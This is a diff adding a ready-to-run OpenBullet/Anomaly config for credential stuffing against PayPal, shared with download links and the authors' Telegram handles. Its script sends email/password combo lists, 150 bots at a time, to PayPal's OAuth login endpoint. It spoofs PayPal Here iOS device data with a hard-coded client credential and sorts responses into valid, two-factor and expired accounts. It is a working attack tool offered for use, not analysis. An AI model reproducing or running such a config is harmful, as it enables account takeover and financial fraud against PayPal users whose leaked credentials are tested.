@@ -1,0 +1,91 @@
+#You can download it as loli from this link:
+https://cdn.discordapp.com/attachments/982266499840491560/1008750019094003822/PayPal_config.anom
+virustotal: https://www.virustotal.com/gui/file/aaadfc758ae4ac782bb3087ba5f6f36a3ecf7f2684d2aebf9c4b7031d61f9e99?nocache=1
+
+ Paypal Api Config
+ ProxyLess 
+ Bot: 150 
+ Cpm: 20~50 
+ 
+
+
+[SETTINGS]
+{
+  "Name": "Paypal",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-28T03:07:35.2973433+04:30",
+  "AdditionalInfo": telegram @MRzodiac2 & @Fakecoderr",
+  "Author": "Fakecoder",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": true,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.paypal.com/v1/oauth2/login" AutoRedirect=FALSE 
+  CONTENT "email=<USER>&password=<PASS>&response_type=token&rememberme=true&scope=https%3A%2F%2Fapi.paypal.com%2Fv1%2Fvault%2Fcredit-card%20openid%20https%3A%2F%2Fapi.paypal.com%2Fv1%2Fvault%2Fcredit-card%2F.%2A%20https%3A%2F%2Furi.paypal.com%2Fservices%2Fpaypalhere&return_authn_schemes=true&grant_type=password&risk_data=%7B%22os_version%22%3A%229.2%22%2C%22c%22%3A%2212%22%2C%22device_model%22%3A%22iPhone%205s%28GSM%29%22%2C%22app_id%22%3A%22com.paypal.here%22%2C%22locale_lang%22%3A%22en%22%2C%22comp_version%22%3A%223.5.1%22%2C%22location%22%3A%7B%22lng%22%3A51.64169494491625%2C%22lat%22%3A32.6421754246147%2C%22timestamp%22%3A1461882278665%2C%22acc%22%3A165%7D%2C%22local_identifier%22%3A%227a854d28-262a-4eb0-9854-175698e2d6c8%22%2C%22sms_enabled%22%3Atrue%2C%22app_guid%22%3A%22eb934e44c9e78649eefa2f58bceb9d3f3b8e4145%22%2C%22cloud_identifier%22%3A%2217f18c74-cdb1-47e2-82e5-1ed537a1a392%22%2C%22vendor_identifier%22%3A%228067B7FF-C665-433D-A15C-4BDC292D9C45%22%2C%22notif_token%22%3Anull%2C%22os_type%22%3A%22iOS%22%2C%22conf_url%22%3A%22https%3A%5C%2F%5C%2Fwww.paypalobjects.com%5C%2Fwebstatic%5C%2Frisk%5C%2Fdyson_config_ios_v4.json%22%2C%22conf_version%22%3A%224.0%22%2C%22ip_addrs%22%3A%22192.168.1.36%22%2C%22is_rooted%22%3Afalse%2C%22proxy_setting%22%3A%22host%3D192.168.1.35%2Cport%3D8888%2Ctype%3DkCFProxyTypeHTTPS%22%2C%22total_storage_space%22%3A%2212718485504%22%2C%22source_app%22%3A10%2C%22payload_type%22%3A%22full%22%2C%22ds%22%3Atrue%2C%22pairing_id%22%3A%224b6b7bb2210d4972b6755567efd208bd%22%2C%22dc_id%22%3A%229728c3c46d03addf4c1081472c7ccf7c%22%2C%22ip_addresses%22%3A%5B%22%3A%3A1%22%2C%22127.0.0.1%22%2C%22fe80%3A%3A1%22%2C%22fe80%3A%3A69%3A2d30%3A97a2%3A89e2%22%2C%22192.168.1.36%22%2C%22fe80%3A%3A80de%3A24ff%3Afe25%3A6932%22%5D%2C%22bssid%22%3A%2248%3Aee%3Ac%3Aa5%3Aa8%3Ab3%22%2C%22tz%22%3A16200000%2C%22locale_country%22%3A%22US%22%2C%22email_configured%22%3Atrue%2C%22tz_name%22%3A%22Asia%5C%2FTehran%22%2C%22linker_id%22%3A%221bc4e94f-8217-41c4-80d7-6f6b7ee7a48e%22%2C%22pin_lock_last_timestamp%22%3A1461882119368%2C%22source_app_version%22%3A%222.6.7%22%2C%22conn_type%22%3A%22wifi%22%2C%22risk_comp_session_id%22%3A%226932c8e4-e220-4c05-8b21-28b728400ec3%22%2C%22ssid%22%3A%22Mohamm%40d%22%2C%22location_auth_status%22%3A%22authorizedWhenInUse%22%2C%22is_emulator%22%3Afalse%2C%22app_version%22%3A%222.6.7%22%2C%22device_name%22%3A%22iPhone%22%2C%22timestamp%22%3A1461882281167%7D&app_info=%7B%22device_app_id%22%3A%22APP-4XA127925G233932C%22%2C%22client_platform%22%3A%22APPLE%22%2C%22app_version%22%3A%22267000%22%7D&redirect_uri=https%3A%2F%2Fwww.paypal.com%2Fpph&device_info=%7B%22device_os_version%22%3A%229.2%22%2C%22device_name%22%3A%22iPhone%22%2C%22device_key_type%22%3A%22APPLE_PHONE%22%2C%22is_device_simulator%22%3Afalse%2C%22device_identifier%22%3A%22eb934e44c9e78649eefa2f58bceb9d3f3b8e4145%22%2C%22device_type%22%3A%22iPhone%22%2C%22device_model%22%3A%22iPhone%22%2C%22device_os%22%3A%22iPhone%20OS%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: PayPalSDK/PPH 267000 (iPhone; iOS 9.2)" 
+  HEADER "Host: api.paypal.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Authorization: Basic QWExMEVCQ3pGVWZud2Vubnl3dU5Jc3g0UXo0SmNwZ25uWjk2eUNXZFloU19SbTNJUVRIZWpxbXdURTRrOg==" 
+  HEADER "X-PAYPAL-REQUEST-SOURCE: MPA-DEVICE_iOS_iPhone6,1_9.2_SDK_1.4.9_com.paypal.here_2.6.7_L0" 
+
+KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "name\":\"RATE_LIMIT_REACHED" 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"invalid_user" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<SOURCE>" DoesNotContain "error\":\"invalid_public_credential" 
+    KEY "<SOURCE>" DoesNotContain "error\":\"stepup_required" 
+    KEY "<SOURCE>" DoesNotContain "\"access_token\":\"" 
+    KEY "\"supported_authn_schemes\"" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "error\":\"invalid_public_credential" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "error\":\"stepup_required" 
+  KEYCHAIN Success AND 
+    KEY "\"access_token\":\"" 
+    KEY "<SOURCE>" DoesNotContain "error\":\"stepup_required" 
